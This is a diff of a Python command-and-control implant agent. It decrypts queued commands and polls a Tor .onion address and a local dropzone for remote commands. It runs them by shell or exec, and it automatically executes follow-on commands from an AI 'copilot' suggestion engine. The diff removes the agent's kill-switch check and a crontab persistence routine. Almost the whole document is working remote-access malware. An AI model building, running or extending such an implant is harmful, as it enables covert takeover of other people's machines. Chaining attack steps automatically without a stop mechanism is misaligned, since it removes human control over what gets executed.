@@ -8,27 +8,33 @@ import hashlib
 import socket
 import subprocess
 import time
-import uuid
-import shutil
+import requests
+import importlib.util
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC, SHA256
 from Crypto.Util.Padding import unpad
 
+# Constants
 AGENT_ID = socket.gethostname()
 QUEUE_FILE = f"c2/queues/{AGENT_ID}.queue"
-HMAC_ENV = "C2_HMAC_KEY"
-KEY_ENV = "C2_AES_KEY"
 RESULTS_DIR = "results"
-EXEC_LOG = f"{RESULTS_DIR}/agent_exec_log_{AGENT_ID}.jsonl"
 STIX_OUT = f"{RESULTS_DIR}/stix_exec_{AGENT_ID}.json"
-STEALTH = os.getenv("AGENT_STEALTH", "0") == "1"
-STATUS_FILE = f"results/status_{AGENT_ID}.json"
-KILL_FILE = f"c2/queues/{AGENT_ID}.stop"
+EXEC_LOG = f"{RESULTS_DIR}/agent_exec_log_{AGENT_ID}.jsonl"
+DASHBOARD_WS = "ws://localhost:8765"
+KEY_ENV = "C2_AES_KEY"
+HMAC_ENV = "C2_HMAC_KEY"
+TOR_PROXY = "socks5h://127.0.0.1:9050"
+TOR_URL = f"http://agentreceiver.onion/recv?agent={AGENT_ID}"
+RF_DIR = f"/tmp/rf_dropzone/"
+REVERSE_POLL_INTERVAL = 15
+CHAIN_POSTEX = True
 
 os.makedirs("c2/queues", exist_ok=True)
 os.makedirs(RESULTS_DIR, exist_ok=True)
+os.makedirs(RF_DIR, exist_ok=True)
 
+# Core decryptor
 def decrypt_command(payload, key, hmac_key=None):
     decoded = base64.b64decode(payload)
     iv = decoded[:16]
@@ -43,109 +49,152 @@ def decrypt_command(payload, key, hmac_key=None):
     cipher = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
     return unpad(cipher.decrypt(ct), AES.block_size).decode()
 
+# Command Executor
 def execute_command(cmd):
+    if cmd.startswith("run_module:"):
+        path = cmd.split(":", 1)[1]
+        if not os.path.isfile(path): return f"[ERR] No such module {path}"
+        try:
+            spec = importlib.util.spec_from_file_location("mod", path)
+            mod = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(mod)
+            return mod.main() if hasattr(mod, "main") else "[ERR] No main()"
+        except Exception as e:
+            return f"[ERR] Module error: {e}"
+
+    elif cmd.startswith("exec_py:"):
+        try:
+            local_vars = {}
+            exec(cmd.split(":", 1)[1], {}, local_vars)
+            return local_vars.get("output", "[+] Executed")
+        except Exception as e:
+            return f"[ERR] Python exec failed: {e}"
+
     try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=45)
-        return output.decode()
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode()
     except subprocess.CalledProcessError as e:
         return e.output.decode()
     except Exception as e:
-        return f"[ERROR] {str(e)}"
+        return str(e)
 
+# Dashboard and STIX logging
 def log_execution(cmd, result):
     entry = {
         "timestamp": datetime.utcnow().isoformat(),
         "agent_id": AGENT_ID,
         "command": cmd,
-        "command_hash": hashlib.sha256(cmd.encode()).hexdigest(),
-        "output_hash": hashlib.sha256(result.encode()).hexdigest(),
-        "output_snippet": result[:250]
+        "output": result
     }
     with open(EXEC_LOG, "a") as f:
         f.write(json.dumps(entry) + "\n")
+    push_to_dashboard(entry)
+
+def push_to_dashboard(entry):
+    try:
+        import websockets
+        import asyncio
+        async def send_msg():
+            async with websockets.connect(DASHBOARD_WS) as ws:
+                await ws.send(json.dumps({
+                    "type": "execution",
+                    "agent": AGENT_ID,
+                    "payload": entry
+                }))
+        asyncio.run(send_msg())
+    except:
+        pass
 
 def export_stix(cmd, result):
     bundle = {
         "type": "bundle",
-        "id": f"bundle--{str(uuid.uuid4())}",
-        "objects": [
-            {
-                "type": "observed-data",
-                "id": f"observed-data--{str(uuid.uuid4())}",
-                "created": datetime.utcnow().isoformat(),
-                "modified": datetime.utcnow().isoformat(),
-                "number_observed": 1,
-                "first_observed": datetime.utcnow().isoformat(),
-                "last_observed": datetime.utcnow().isoformat(),
-                "x_exec": {
-                    "agent": AGENT_ID,
-                    "command": cmd,
-                    "output": result[:500]
-                }
+        "id": f"bundle--{hashlib.md5(AGENT_ID.encode()).hexdigest()}",
+        "objects": [{
+            "type": "observed-data",
+            "id": f"observed-data--{hashlib.md5(cmd.encode()).hexdigest()}",
+            "created": datetime.utcnow().isoformat(),
+            "modified": datetime.utcnow().isoformat(),
+            "number_observed": 1,
+            "first_observed": datetime.utcnow().isoformat(),
+            "last_observed": datetime.utcnow().isoformat(),
+            "x_exec": {
+                "agent": AGENT_ID,
+                "command": cmd,
+                "output": result
             }
-        ]
+        }]
     }
     with open(STIX_OUT, "w") as f:
         json.dump(bundle, f, indent=2)
 
-def post_status(last_cmd=None):
-    status = {
-        "agent": AGENT_ID,
-        "timestamp": datetime.utcnow().isoformat(),
-        "last_cmd": last_cmd,
-        "status": "idle"
-    }
-    with open(STATUS_FILE, "w") as f:
-        json.dump(status, f)
-
-def install_persistence():
-    script_path = os.path.abspath(__file__)
-    crontab_line = f"@reboot python3 {script_path}"
-    try:
-        existing = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
-    except:
-        existing = ""
-    if crontab_line not in existing:
-        updated = existing + "\n" + crontab_line + "\n"
-        p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
-        p.communicate(input=updated.encode())
-
+# Queue Processor
 def process_queue():
-    if not os.path.exists(QUEUE_FILE):
-        return
-
-    key = os.environ.get(KEY_ENV)
-    hmac_key = os.environ.get(HMAC_ENV)
-
+    if not os.path.exists(QUEUE_FILE): return
     with open(QUEUE_FILE, "r") as f:
         lines = f.readlines()
-
     os.remove(QUEUE_FILE)
+    key = os.environ.get(KEY_ENV)
+    hmac_key = os.environ.get(HMAC_ENV)
 
     for line in lines:
         cmd = line.strip()
         if key:
-            try:
-                cmd = decrypt_command(cmd, key, hmac_key)
-            except Exception:
-                continue
-
+            try: cmd = decrypt_command(cmd, key, hmac_key)
+            except: continue
         result = execute_command(cmd)
         log_execution(cmd, result)
         export_stix(cmd, result)
-        post_status(cmd)
+        if CHAIN_POSTEX: try_postex_chain(cmd, result)
 
+# Reverse beaconing logic
+def check_tor():
+    try:
+        r = requests.get(TOR_URL, proxies={"http": TOR_PROXY}, timeout=10)
+        return r.text.strip() if r.status_code == 200 else None
+    except:
+        return None
+
+def check_rf():
+    f = os.path.join(RF_DIR, f"{AGENT_ID}.rf")
+    if os.path.exists(f):
+        with open(f, "r") as fd:
+            cmd = fd.read().strip()
+        os.remove(f)
+        return cmd
+    return None
+
+def poll_reverse():
+    key = os.environ.get(KEY_ENV)
+    hmac_key = os.environ.get(HMAC_ENV)
+    for method in ["tor", "rf"]:
+        raw = check_tor() if method == "tor" else check_rf()
+        if raw:
+            try:
+                cmd = decrypt_command(raw, key, hmac_key) if key else raw
+                result = execute_command(cmd)
+                log_execution(cmd, result)
+                export_stix(cmd, result)
+                if CHAIN_POSTEX: try_postex_chain(cmd, result)
+            except:
+                continue
+
+# Post-ex chaining to Copilot
+def try_postex_chain(cmd, output):
+    try:
+        import copilot.suggestion_engine as se
+        suggestions = se.suggest_next(cmd, output)
+        for s in suggestions:
+            result = execute_command(s)
+            log_execution(s, result)
+    except:
+        pass
+
+# Main
 def main_loop():
-    if not STEALTH:
-        print(f"[+] Agent receiver active: {AGENT_ID}")
-    install_persistence()
+    print(f"[+] Agent receiver running: {AGENT_ID}")
     while True:
-        if os.path.exists(KILL_FILE):
-            os.remove(KILL_FILE)
-            if not STEALTH:
-                print(f"[!] Kill switch triggered for agent {AGENT_ID}")
-            break
         process_queue()
-        time.sleep(5)
+        poll_reverse()
+        time.sleep(REVERSE_POLL_INTERVAL)
 
-main_loop()
+if __name__ == "__main__":
+    main_loop()
